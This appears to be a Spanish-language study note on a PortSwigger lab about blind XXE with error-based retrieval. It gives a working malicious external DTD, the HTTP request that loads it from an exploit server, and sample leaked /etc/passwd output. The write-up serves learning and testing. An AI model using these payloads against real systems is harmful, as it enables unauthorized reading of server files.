---
aliases:
  - XXE 007 - error-based con DTD externo
  - blind xxe error based
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 007 — XXE ciego: error-based con DTD externo

> Lab: [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]]:** la exfil por HTTP anda... hasta que el archivo tiene **saltos de línea** (`/etc/passwd`) que **rompen la URL**; o directamente **no tengo canal OOB** para el contenido.
- **Qué aprovecho:** el parser **muestra errores verbosos**.
- **Entonces:** fuerzo un error abriendo una ruta **inexistente cuyo nombre contiene el archivo** → el **mensaje de error** trae el contenido, y vuelve en la **respuesta** (no en el Collaborator).

## Cómo explotarlo (3 partes)

### 1. El DTD malicioso — qué debe contener
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- `%file` → lee `/etc/passwd`.
- `%error` → apunta a `file:///nonexistent/<contenido>` → el parser **falla y filtra el contenido**.
- `&#x25;` = `%` escapado (igual que en 006).

### 2. Hospedar en el exploit server
File `/exploit.dtd`, Body = el DTD, **Store** → `https://EXPLOIT.exploit-server.net/exploit.dtd`.

### 3. La request que carga el DTD
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
La **respuesta HTTP** trae:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Detalles que se pasan por alto
- **Acá el dato vuelve en la RESPUESTA**, no en el Collaborator (a diferencia de [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]]) → no hace falta pollear.
- Salida ideal para archivos **multilínea** (`/etc/passwd`).
- Requiere **errores verbosos**. Si los traga → volvé a exfil OOB (FTP) o [[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008 — DTD local]].

→ **Siguiente:** ¿y si el server **no sale a internet** (no puedo ni cargar un DTD externo)? → [[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008 — reutilizar DTD local]].
